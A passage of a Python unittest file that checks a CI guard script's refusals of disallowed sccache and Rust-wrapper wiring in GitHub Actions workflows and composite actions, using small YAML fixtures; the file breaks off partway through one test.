#!/usr/bin/env python3
"""Refusal proofs for `verify-manifest.py`'s step checks (checks 6 and 7),
merge-queue safety check (check 8), release-only skip-as-pass check
(check 9), and fast-gate-first check (check 10).

Check 7 covers content-pinned `uses:`/images, the hash-checked pip shape, and
env-file writes only through `github-env.sh`; its cases sit in
`TestPinnedInputsAndEnvFileWrites` and `TestGithubEnvHelper`. Check 8's sit in
`TestMergeQueueSafety`.

Each rejection the guard is supposed to make (a raw sccache-action reference,
a case-variant `uses:`, an env key at workflow/job/step level, a `$GITHUB_ENV`
write, a deterministic job pulling in sccache, a broken composite) gets its
own fixture tree and its own test, per PRINCIPLES.md "Prove the refusals": a
guard no test drives is a guard one edit away from silently vanishing. One
positive case proves the happy path still passes cleanly.

Pure stdlib `unittest`, no network, no PyYAML dependency beyond what
verify-manifest.py itself already requires.
"""

from __future__ import annotations

import importlib.util
import json
import os
import sys
import tempfile
import textwrap
import unittest
from unittest import mock

HERE = os.path.dirname(os.path.abspath(__file__))
MODULE_PATH = os.path.join(HERE, "verify-manifest.py")

_spec = importlib.util.spec_from_file_location("verify_manifest", MODULE_PATH)
assert _spec is not None and _spec.loader is not None
verify_manifest = importlib.util.module_from_spec(_spec)
sys.modules["verify_manifest"] = verify_manifest
_spec.loader.exec_module(verify_manifest)

check_workflow_steps = verify_manifest.check_workflow_steps
check_merge_queue = verify_manifest.check_merge_queue
check_release_only_skips = verify_manifest.check_release_only_skips
check_fast_gate_first = verify_manifest.check_fast_gate_first
check_pull_request_target = verify_manifest.check_pull_request_target
check_trust_roots = verify_manifest.check_trust_roots

# The live sanctioned composite is the fixture: the canonical form is proven
# against the file CI actually runs, never a hand-kept copy.
with open(os.path.join(os.path.dirname(HERE), "actions", "sccache", "action.yml")) as _f:
    VALID_COMPOSITE = _f.read()
with open(os.path.join(HERE, "github-env-allowlist.txt")) as _f:
    VALID_ENV_ALLOWLIST = _f.read()


def _write(path: str, content: str) -> None:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        f.write(content)


# The `.github/ci/` tools a fixture holds: a tool run names a file that exists.
FIXTURE_TOOLS = (
    "verify-manifest.py", "artifact-guard.sh", "github-env.sh", "strict_yaml.py", "release_only.py",
    "deterministic_checks_output.py", "change_class.py",
)


class SccacheFixture:
    """A scratch repository whose `.github/` holds workflows/, actions/sccache/,
    ci/ — `repo` is the repository root local `uses: ./...` resolve against."""

    def __init__(self, tmp: str, *, composite: str | None = VALID_COMPOSITE):
        self.repo = tmp
        self.root = os.path.join(tmp, ".github")
        os.makedirs(self.root, exist_ok=True)
        tmp = self.root
        if composite is not None:
            _write(os.path.join(tmp, "actions", "sccache", "action.yml"), composite)
        _write(os.path.join(tmp, "ci", "github-env-allowlist.txt"), VALID_ENV_ALLOWLIST)
        for tool in FIXTURE_TOOLS:
            _write(os.path.join(tmp, "ci", tool), "")
        self.deterministic_checks(context="unrelated", step="Unrelated step")

    def workflow(self, fname: str, content: str) -> None:
        _write(os.path.join(self.root, "workflows", fname), content)

    def composite(self, name: str, content: str) -> None:
        """Write an arbitrary local composite action at
        `.github/actions/<name>/action.yml` — for wrapper/nesting/escape
        fixtures, distinct from the sanctioned sccache composite itself."""
        _write(os.path.join(self.root, "actions", name, "action.yml"), content)

    def deterministic_checks(self, *, context: str, step: str) -> None:
        import json

        _write(
            os.path.join(self.root, "ci", "deterministic-checks.json"),
            json.dumps({"about": "fixture", "checks": [{"context": context, "step": step}]}),
        )

    def errors(self) -> list[str]:
        errors: list[str] = []
        check_workflow_steps(errors, root=self.root)
        return errors


class TestSccacheWiringRefusals(unittest.TestCase):
    def setUp(self) -> None:
        self._tmpdir = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmpdir.cleanup)
        self.fx = SccacheFixture(self._tmpdir.name)

    # ---- positive case ------------------------------------------------

    def test_composite_in_non_deterministic_job_passes_cleanly(self) -> None:
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    steps:
                      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1
                      - uses: ./.github/actions/sccache
                      - run: cargo build
                """
            ),
        )
        self.assertEqual(self.fx.errors(), [])

    # ---- (a) raw action reference outside the composite ----------------

    def test_raw_sccache_action_outside_composite_is_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    steps:
                      - uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad
                      - run: cargo build
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any("runs the raw" in e and "build" in e for e in errors), errors
        )

    def test_case_variant_uses_is_still_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    steps:
                      - uses: Mozilla-Actions/Sccache-Action@7d986dd989559c6ecdb630a3fd2557667be217ad
                      - run: cargo build
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(any("runs the raw" in e for e in errors), errors)

    # ---- (b) env key at each scope --------------------------------------

    def test_workflow_level_env_is_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                env:
                  RUSTC_WRAPPER: sccache
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    steps:
                      - uses: ./.github/actions/sccache
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any("workflow-level env sets" in e and "rustc_wrapper" in e for e in errors),
            errors,
        )

    def test_job_level_env_is_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    env:
                      SCCACHE_GHA_ENABLED: "true"
                    steps:
                      - uses: ./.github/actions/sccache
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any(
                "job 'build' env sets" in e and "sccache_gha_enabled" in e
                for e in errors
            ),
            errors,
        )

    def test_step_level_env_is_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    steps:
                      - uses: ./.github/actions/sccache
                      - name: Some step
                        env:
                          RUSTC_WRAPPER: ""
                        run: cargo build
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any("step 'Some step' env sets" in e for e in errors), errors
        )

    # ---- (c) $GITHUB_ENV write outside the composite --------------------

    def test_github_env_write_outside_composite_is_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    steps:
                      - name: Sneak the wrapper in
                        run: |
                          echo "RUSTC_WRAPPER=sccache" >> "$GITHUB_ENV"
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any("writes RUSTC_WRAPPER" in e and "GITHUB_ENV" in e for e in errors),
            errors,
        )

    # ---- (d) composite in a job owning a deterministic check step -------

    def test_composite_in_deterministic_job_is_refused(self) -> None:
        self.fx.deterministic_checks(context="clippy", step="Run clippy")
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  clippy:
                    runs-on: ubuntu-latest
                    steps:
                      - uses: ./.github/actions/sccache
                      - name: Run clippy
                        run: cargo clippy
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any(
                "job 'clippy' uses ./.github/actions/sccache" in e
                and "Run clippy" in e
                for e in errors
            ),
            errors,
        )

    def test_composite_in_non_deterministic_job_is_fine_even_with_the_file_present(
        self,
    ) -> None:
        # Same deterministic-checks.json as above, but the composite is used by
        # a DIFFERENT job that does not own the named step — must not false-positive.
        self.fx.deterministic_checks(context="clippy", step="Run clippy")
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  clippy:
                    runs-on: ubuntu-latest
                    steps:
                      - name: Run clippy
                        run: cargo clippy
                  build:
                    runs-on: ubuntu-latest
                    steps:
                      - uses: ./.github/actions/sccache
                      - run: cargo build
                """
            ),
        )
        self.assertEqual(self.fx.errors(), [])

    # ---- composite self-validation --------------------------------------

    def test_missing_composite_file_is_refused(self) -> None:
        empty_tmpdir = tempfile.TemporaryDirectory()
        self.addCleanup(empty_tmpdir.cleanup)
        fx = SccacheFixture(empty_tmpdir.name, composite=None)
        fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    steps:
                      - run: cargo build
                """
            ),
        )
        errors = fx.errors()
        self.assertTrue(any("does not exist" in e for e in errors), errors)

    def test_composite_not_actually_composite_is_refused(self) -> None:
        fx = SccacheFixture(
            self._tmpdir.name,
            composite=textwrap.dedent(
                """\
                name: not composite
                runs:
                  using: node20
                  main: index.js
                """
            ),
        )
        fx.workflow(
            "ci.yml",
            "name: ci\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: x\n",
        )
        errors = fx.errors()
        self.assertTrue(any("must be 'composite'" in e for e in errors), errors)

    def test_composite_missing_env_write_is_refused(self) -> None:
        fx = SccacheFixture(
            self._tmpdir.name,
            composite=textwrap.dedent(
                """\
                name: incomplete
                runs:
                  using: composite
                  steps:
                    - uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad
                """
            ),
        )
        fx.workflow(
            "ci.yml",
            "name: ci\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: x\n",
        )
        errors = fx.errors()
        self.assertTrue(
            any("exactly two steps" in e for e in errors), errors
        )

    # ---- (1) normalized local `uses:` path, not raw-string, comparison ---

    def test_trailing_slash_composite_path_is_still_caught_by_rule_d(self) -> None:
        self.fx.deterministic_checks(context="clippy", step="Run clippy")
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  clippy:
                    runs-on: ubuntu-latest
                    steps:
                      - uses: ./.github/actions/sccache/
                      - name: Run clippy
                        run: cargo clippy
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any(
                "job 'clippy' uses ./.github/actions/sccache" in e
                and "Run clippy" in e
                for e in errors
            ),
            errors,
        )

    def test_dotted_composite_path_is_still_caught_by_rule_d(self) -> None:
        self.fx.deterministic_checks(context="clippy", step="Run clippy")
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  clippy:
                    runs-on: ubuntu-latest
                    steps:
                      - uses: ./.github/actions/./sccache
                      - name: Run clippy
                        run: cargo clippy
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any(
                "job 'clippy' uses ./.github/actions/sccache" in e
                and "Run clippy" in e
                for e in errors
            ),
            errors,
        )

    # ---- (2) other local composite actions are audited, not just workflows

    def test_other_composite_running_raw_sccache_action_is_refused(self) -> None:
        self.fx.composite(
            "leaky",
            textwrap.dedent(
                """\
                name: leaky
                description: not the sanctioned composite
                runs:
                  using: composite
                  steps:
                    - uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any("runs the raw" in e and "leaky" in e for e in errors), errors
        )

    def test_other_composite_writing_github_env_is_refused(self) -> None:
        self.fx.composite(
            "sneaky",
            textwrap.dedent(
                """\
                name: sneaky
                description: hand-wires the wrapper itself
                runs:
                  using: composite
                  steps:
                    - name: Wire it by hand
                      shell: bash
                      run: |
                        echo "RUSTC_WRAPPER=sccache" >> "$GITHUB_ENV"
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any("writes RUSTC_WRAPPER" in e and "sneaky" in e for e in errors), errors
        )

    def test_other_composite_nesting_sccache_is_reachable_via_rule_d(self) -> None:
        self.fx.composite(
            "wrapper",
            textwrap.dedent(
                """\
                name: wrapper
                description: wraps the sanctioned composite one level deep
                runs:
                  using: composite
                  steps:
                    - uses: ./.github/actions/sccache
                """
            ),
        )
        self.fx.deterministic_checks(context="clippy", step="Run clippy")
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  clippy:
                    runs-on: ubuntu-latest
                    steps:
                      - uses: ./.github/actions/wrapper
                      - name: Run clippy
                        run: cargo clippy
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any(
                "job 'clippy' uses" in e
                and "via" in e
                and "wrapper" in e
                and "Run clippy" in e
                for e in errors
            ),
            errors,
        )

    # ---- (3) a $GITHUB_ENV write need not use `KEY=` assignment syntax ----

    def test_printf_style_github_env_write_is_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    steps:
                      - name: Sneak the wrapper in
                        run: |
                          printf '%s=%s\\n' RUSTC_WRAPPER sccache >> "$GITHUB_ENV"
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any(
                "writes RUSTC_WRAPPER" in e and "GITHUB_ENV" in e and "build" in e
                for e in errors
            ),
            errors,
        )

    # ---- (4) the fuller wrapper-var SSOT is enforced, not just RUSTC_WRAPPER

    def test_cargo_build_rustc_wrapper_env_key_is_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    env:
                      CARGO_BUILD_RUSTC_WRAPPER: sccache
                    steps:
                      - uses: ./.github/actions/sccache
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any(
                "job 'build' env sets" in e and "cargo_build_rustc_wrapper" in e
                for e in errors
            ),
            errors,
        )

    # ---- (5) `.yaml` workflows are scanned, not just `.yml` ---------------

    def test_dot_yaml_workflow_extension_is_scanned(self) -> None:
        self.fx.workflow(
            "nightly.yaml",
            textwrap.dedent(
                """\
                name: nightly
                on: schedule
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    steps:
                      - uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any("runs the raw" in e and "nightly.yaml" in e for e in errors), errors
        )

    # ---- (6) container:/services: env scopes are scanned too --------------

    def test_container_env_is_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    container:
                      image: rust:latest
                      env:
                        RUSTC_WRAPPER: sccache
                    steps:
                      - uses: ./.github/actions/sccache
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any(
                "job 'build' container env sets" in e and "rustc_wrapper" in e
                for e in errors
            ),
            errors,
        )

    def test_service_env_is_refused(self) -> None:
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    services:
                      db:
                        image: postgres
                        env:
                          SCCACHE_GHA_ENABLED: "true"
                    steps:
                      - uses: ./.github/actions/sccache
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any(
                "job 'build' service 'db' env sets" in e
                and "sccache_gha_enabled" in e
                for e in errors
            ),
            errors,
        )

    # ---- (7) a non-mapping `env:` fails closed instead of defaulting empty

    def test_non_mapping_workflow_env_fails_closed(self) -> None:
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                env: ${{ fromJSON(vars.E) }}
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    steps:
                      - uses: ./.github/actions/sccache
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any("not a plain mapping" in e and "ci.yml" in e for e in errors), errors
        )

    def test_non_mapping_step_env_fails_closed(self) -> None:
        self.fx.workflow(
            "ci.yml",
            textwrap.dedent(
                """\
                name: ci
                on: push
                jobs:
                  build:
                    runs-on: ubuntu-latest
                    steps:
                      - uses: ./.github/actions/sccache
                      - name: Some step
                        env: ${{ fromJSON(vars.E) }}
                        run: cargo build
                """
            ),
        )
        errors = self.fx.errors()
        self.assertTrue(
            any(
                "not a plain mapping" in e and "Some step" in e for e in errors
            ),
            errors,
        )



def _ci(job_body: str, *, top: str = "") -> str:
    """A one-job `ci.yml` (job id `clippy`) with `job_body` under the job."""
    return (
        "name: ci\non: push\n"
        + top
        + "jobs:\n  clippy:\n    runs-on: ubuntu-latest\n"
        + textwrap.indent(textwrap.dedent(job_body), "    ")
    )


class TestSccacheWiringClosure(unittest.TestCase):
    """Each class of wiring check 6 must refuse, one fixture per shape."""

    def setUp(self) -> None:
        self._tmpdir = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmpdir.cleanup)
        self.fx = SccacheFixture(self._tmpdir.name)

    def assertRefused(self, *needles: str) -> list[str]:
        errors = self.fx.errors()
        self.assertTrue(any(all(n in e for n in needles) for e in errors), errors)
        return errors

    def ci(self, job_body: str, **kw: str) -> None:
        self.fx.workflow("ci.yml", _ci(job_body, **kw))

    def repo_action(self, rel_dir: str, content: str, fname: str = "action.yml") -> None:
        _write(os.path.join(self.fx.repo, rel_dir, fname), textwrap.dedent(content))

    # ---- positive: benign shapes stay clean ------------------------------

    def test_yaml_comment_naming_the_wrapper_is_not_scanned(self) -> None:
        self.fx.workflow(
            "ci.yml",
            "# a job that wants RUSTC_WRAPPER uses ./.github/actions/sccache\n"
            + _ci("steps:\n  - uses: ./.github/actions/sccache\n  - run: cargo build\n"),
        )
        self.assertEqual(self.fx.errors(), [])

    def test_benign_composite_outside_github_actions_passes(self) -> None:
        self.repo_action(
            "tools/ci/setup",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: rustc --version\n",
        )
        self.ci("steps:\n  - uses: ./tools/ci/setup\n  - run: cargo build\n")
        self.assertEqual(self.fx.errors(), [])

    # ---- (c) free-text wiring, no $GITHUB_ENV needed ----------------------

    def test_inline_env_in_run_is_refused(self) -> None:
        self.ci("steps:\n  - name: Build\n    run: RUSTC_WRAPPER=sccache cargo build\n")
        self.assertRefused("step 'Build' run:", "RUSTC_WRAPPER")

    def test_export_in_run_is_refused(self) -> None:
        self.ci("steps:\n  - name: Build\n    run: export rustc_workspace_wrapper=sccache\n")
        self.assertRefused("step 'Build' run:")

    def test_step_shell_wrapper_is_refused(self) -> None:
        self.ci(
            "steps:\n  - name: Build\n    shell: env RUSTC_WRAPPER=sccache bash -e {0}\n"
            "    run: cargo build\n"
        )
        self.assertRefused("step 'Build' shell:")

    def test_job_defaults_run_shell_is_refused(self) -> None:
        self.ci(
            "defaults:\n  run:\n    shell: env RUSTC_WRAPPER=sccache bash {0}\n"
            "steps:\n  - run: cargo build\n"
        )
        self.assertRefused("job 'clippy' defaults.run.shell")

    def test_workflow_defaults_run_shell_is_refused(self) -> None:
        self.ci(
            "steps:\n  - run: cargo build\n",
            top="defaults:\n  run:\n    shell: env SCCACHE_GHA_ENABLED=true bash {0}\n",
        )
        self.assertRefused("ci.yml: workflow-level defaults.run.shell")

    def test_cargo_config_flag_is_refused(self) -> None:
        self.ci("steps:\n  - name: Build\n    run: cargo --config build.rustc-wrapper='\"sccache\"' build\n")
        self.assertRefused("step 'Build' run:", "rustc-wrapper")

    def test_cargo_config_file_write_is_refused(self) -> None:
        self.ci(
            "steps:\n  - name: Cfg\n"
            "    run: printf '[build]\\nrustc-wrapper = \"sccache\"\\n' >> ~/.cargo/config.toml\n"
        )
        self.assertRefused("step 'Cfg' run:")

    def test_with_input_naming_the_wrapper_is_refused(self) -> None:
        self.ci("steps:\n  - uses: some/action@0123456789abcdef0123456789abcdef01234567\n    with:\n      rustc-wrapper: sccache\n")
        self.assertRefused("with.rustc-wrapper")

    def test_composite_step_shell_wrapper_is_refused(self) -> None:
        self.fx.composite(
            "w",
            "runs:\n  using: composite\n  steps:\n"
            "    - shell: env RUSTC_WRAPPER=sccache bash {0}\n      run: cargo build\n",
        )
        self.ci("steps:\n  - uses: ./.github/actions/w\n")
        self.assertRefused("./.github/actions/w/action.yml", "shell:")

    # ---- (b) every wrapper key, every scope ------------------------------

    def test_workspace_wrapper_env_keys_are_refused(self) -> None:
        for key in ("RUSTC_WORKSPACE_WRAPPER", "CARGO_BUILD_RUSTC_WORKSPACE_WRAPPER"):
            with self.subTest(key=key):
                self.ci(f"env:\n  {key}: sccache\nsteps:\n  - run: cargo build\n")
                self.assertRefused("job 'clippy' env sets", key.casefold())

    def test_env_key_inside_other_composite_is_refused(self) -> None:
        self.fx.composite(
            "w",
            "runs:\n  using: composite\n  steps:\n"
            "    - name: B\n      shell: bash\n      run: cargo build\n"
            "      env:\n        RUSTC_WRAPPER: sccache\n",
        )
        self.ci("steps:\n  - uses: ./.github/actions/w\n")
        self.assertRefused("./.github/actions/w/action.yml: step 'B' env sets")

    def test_non_mapping_env_at_every_scope_fails_closed(self) -> None:
        expr = "${{ fromJSON(vars.E) }}"
        cases = {
            "job": f"env: {expr}\nsteps: []\n",
            "container": f"container:\n  image: rust\n  env: {expr}\nsteps: []\n",
            "service": f"services:\n  db:\n    image: pg\n    env: {expr}\nsteps: []\n",
        }
        for scope, body in cases.items():
            with self.subTest(scope=scope):
                self.ci(body)
                self.assertRefused("not a plain mapping")
        self.ci("steps:\n  - uses: ./.github/actions/w\n")
        self.fx.composite(
            "w",
            f"runs:\n  using: composite\n  steps:\n    - name: B\n      shell: bash\n"
            f"      run: x\n      env: {expr}\n",
        )
        self.assertRefused("./.github/actions/w/action.yml: step 'B'", "not a plain mapping")

    # ---- local `uses:` resolution (F1) -----------------------------------

    def test_unresolved_local_action_is_refused(self) -> None:
        for uses in ("./.github/actions/sccache@main", "./tools/ci/cache", "./.github/actions/nope"):
            with self.subTest(uses=uses):
                self.ci(f"steps:\n  - uses: {uses}\n")
                self.assertRefused("does not exist")

    def test_local_action_escaping_repo_is_refused(self) -> None:
        self.ci("steps:\n  - uses: ./../elsewhere\n")
        self.assertRefused("escapes the repository root")

    def test_node_and_docker_local_actions_are_refused(self) -> None:
        for using in ("node20", "docker"):
            with self.subTest(using=using):
                self.fx.composite("opaque", f"runs:\n  using: {using}\n  main: index.js\n")
                self.ci("steps:\n  - uses: ./.github/actions/opaque\n")
                self.assertRefused("must be 'composite'", repr(using))

    def test_both_action_yml_and_yaml_is_refused(self) -> None:
        self.fx.composite("w", "runs:\n  using: composite\n  steps: []\n")
        _write(
            os.path.join(self.fx.root, "actions", "w", "action.yaml"),
            "runs:\n  using: composite\n  steps: []\n",
        )
        self.ci("steps:\n  - uses: ./.github/actions/w\n")
        self.assertRefused("both action.yml and action.yaml")

    def test_action_yaml_extension_is_resolved(self) -> None:
        _write(
            os.path.join(self.fx.root, "actions", "w", "action.yaml"),
            "runs:\n  using: composite\n  steps:\n    - uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n",
        )
        self.ci("steps:\n  - uses: ./.github/actions/w\n")
        self.assertRefused("./.github/actions/w/action.yml", "runs the raw")

    def test_composite_outside_github_actions_reaching_sccache_hits_rule_d(self) -> None:
        self.fx.deterministic_checks(context="clippy", step="Run clippy")
        self.repo_action(
            "tools/ci/cache",
            "runs:\n  using: composite\n  steps:\n    - uses: ./.github/actions/sccache\n",
        )
        self.ci("steps:\n  - uses: ./tools/ci/cache\n  - name: Run clippy\n    run: cargo clippy\n")
        self.assertRefused("job 'clippy' uses", "via ./tools/ci/cache", "Run clippy")

    def test_nested_path_composite_running_raw_action_is_refused(self) -> None:
        self.fx.composite("x/y", "runs:\n  using: composite\n  steps:\n    - uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n")
        self.ci("steps:\n  - uses: ./.github/actions/x/y\n")
        self.assertRefused("./.github/actions/x/y/action.yml", "runs the raw")

    def test_case_variant_sanctioned_path_hits_rule_d(self) -> None:
        self.fx.deterministic_checks(context="clippy", step="Run clippy")
        self.ci(
            "steps:\n  - uses: ./.github/actions/sccache\n  - uses: ./.github/Actions/SCCACHE\n"
            "  - name: Run clippy\n    run: cargo clippy\n"
        )
        self.assertRefused("job 'clippy' uses ./.github/actions/sccache", "Run clippy")

    def test_nesting_past_the_bound_is_refused(self) -> None:
        self.fx.deterministic_checks(context="clippy", step="Run clippy")
        limit = verify_manifest.LOCAL_ACTION_DEPTH_LIMIT
        for i in range(limit + 5):
            self.fx.composite(
                f"c{i}", f"runs:\n  using: composite\n  steps:\n    - uses: ./.github/actions/c{i + 1}\n"
            )
        self.fx.composite(
            f"c{limit + 5}", "runs:\n  using: composite\n  steps:\n    - uses: ./.github/actions/sccache\n"
        )
        self.ci("steps:\n  - uses: ./.github/actions/c0\n  - name: Run clippy\n    run: cargo clippy\n")
        self.assertRefused("nesting exceeds")

    def test_nesting_at_the_bound_is_decided(self) -> None:
        self.fx.deterministic_checks(context="clippy", step="Run clippy")
        limit = verify_manifest.LOCAL_ACTION_DEPTH_LIMIT
        for i in range(limit - 1):
            self.fx.composite(
                f"c{i}", f"runs:\n  using: composite\n  steps:\n    - uses: ./.github/actions/c{i + 1}\n"
            )
        self.fx.composite(
            f"c{limit - 1}", "runs:\n  using: composite\n  steps:\n    - uses: ./.github/actions/sccache\n"
        )
        self.ci("steps:\n  - uses: ./.github/actions/c0\n  - name: Run clippy\n    run: cargo clippy\n")
        errors = self.assertRefused("job 'clippy' uses", "via ./.github/actions/c0")
        self.assertFalse(any("nesting exceeds" in e for e in errors), errors)

    def test_local_action_cycle_is_refused(self) -> None:
        self.fx.composite("a", "runs:\n  using: composite\n  steps:\n    - uses: ./.github/actions/b\n")
        self.fx.composite("b", "runs:\n  using: composite\n  steps:\n    - uses: ./.github/actions/a\n")
        self.ci("steps:\n  - uses: ./.github/actions/a\n")
        self.assertRefused("local action cycle")

    def test_job_level_reusable_workflow_is_refused(self) -> None:
        self.fx.workflow("called.yml", _ci("steps:\n  - run: cargo build\n"))
        for call in (
            "./.github/workflows/gone.yml",
            "./.github/workflows/called.yml",
            "owner/repo/.github/workflows/w.yml@v1",
        ):
            with self.subTest(call=call):
                self.fx.workflow("ci.yml", f"name: ci\non: push\njobs:\n  a:\n    uses: {call}\n")
                self.assertRefused("job 'a': calls a reusable workflow", call)

    # ---- byte-exact local-action identity ---------------------------------

    def test_referenced_case_variant_of_sanctioned_composite_is_refused(self) -> None:
        self.fx.composite(
            "SCCACHE",
            "runs:\n  using: composite\n  steps:\n    - uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n"
            "    - shell: bash\n      run: echo \"RUSTC_WRAPPER=\" >> \"$GITHUB_ENV\"\n",
        )
        self.ci("steps:\n  - uses: ./.github/actions/SCCACHE\n")
        errors = self.assertRefused("'./.github/actions/SCCACHE' is case-fold-equal to '.github/actions/sccache'")
        self.assertTrue(any("holds case-fold-equal entries 'SCCACHE' and 'sccache'" in e for e in errors), errors)

    def test_unreferenced_case_variant_sibling_is_refused(self) -> None:
        self.fx.composite("SCCACHE", "runs:\n  using: composite\n  steps: []\n")
        self.ci("steps:\n  - uses: ./.github/actions/sccache\n  - run: cargo build\n")
        self.assertRefused("holds case-fold-equal entries 'SCCACHE' and 'sccache'")

    def test_case_variant_exemption_needs_the_sanctioned_file_absent_too(self) -> None:
        fx = SccacheFixture(self._tmpdir.name + "/bare", composite=None)
        fx.composite("SCCACHE", "runs:\n  using: composite\n  steps:\n    - uses: mozilla-actions/sccache-action@7d986dd989559c6ecdb630a3fd2557667be217ad\n")
        fx.workflow("ci.yml", _ci("steps:\n  - uses: ./.github/actions/SCCACHE\n"))
        errors = fx.errors()
        self.assertTrue(any("case-fold-equal" in e or "runs the raw" in e for e in errors), errors)
        self.assertFalse(any("uses ./.github/actions/sccache" in e for e in errors), errors)

    def test_reference_differing_in_case_from_disk_is_refused(self) -> None:
        self.repo_action("tools/w", "runs:\n  using: composite\n  steps: []\n")
        self.ci("steps:\n  - uses: ./tools/W\n")
        self.assertRefused("names 'W' but the directory holds 'w'", "byte-exact")

    def test_case_variant_twin_directory_on_reference_path_is_refused(self) -> None:
        benign = "runs:\n  using: composite\n  steps: []\n"
        self.repo_action("tools/ci/setup", benign)
        self.repo_action("tools/CI/setup", benign)
        self.ci("steps:\n  - uses: ./tools/ci/setup\n")
        self.assertRefused("passes through", "case-fold-equal entries ['CI', 'ci']")

    # ---- env values and rustc-replacing keys ------------------------------

    def test_env_value_naming_a_wiring_key_is_refused_at_every_scope(self) -> None:
        write = "run: echo \"$K=sccache\" >> \"$GITHUB_ENV\"\n"
        cases = {
            "workflow": ({"top": "env:\n  K: RUSTC_WRAPPER\n"}, f"steps:\n  - {write}", "workflow-level env.K"),
            "job": ({}, f"env:\n  K: RUSTC_WRAPPER\nsteps:\n  - {write}", "job 'clippy' env.K"),
            "step": ({}, f"steps:\n  - name: S\n    env:\n      K: RUSTC_WRAPPER\n    {write}", "step 'S' env.K"),
            "container": (
                {},
                f"container:\n  image: rust\n  env:\n    K: RUSTC_WRAPPER\nsteps:\n  - {write}",
                "job 'clippy' container.env.K",
            ),
            "service": (
                {},
                f"services:\n  db:\n    image: pg\n    env:\n      K: SCCACHE_DIR\nsteps:\n  - {write}",
                "job 'clippy' services.db.env.K",
            ),
        }
        for scope, (kw, body, needle) in cases.items():
            with self.subTest(scope=scope):
                self.ci(body, **kw)
                self.assertRefused(needle)

    def test_env_value_in_other_composite_is_refused(self) -> None:
        self.fx.composite(
            "w",
            "runs:\n  using: composite\n  steps:\n    - name: B\n      shell: bash\n"
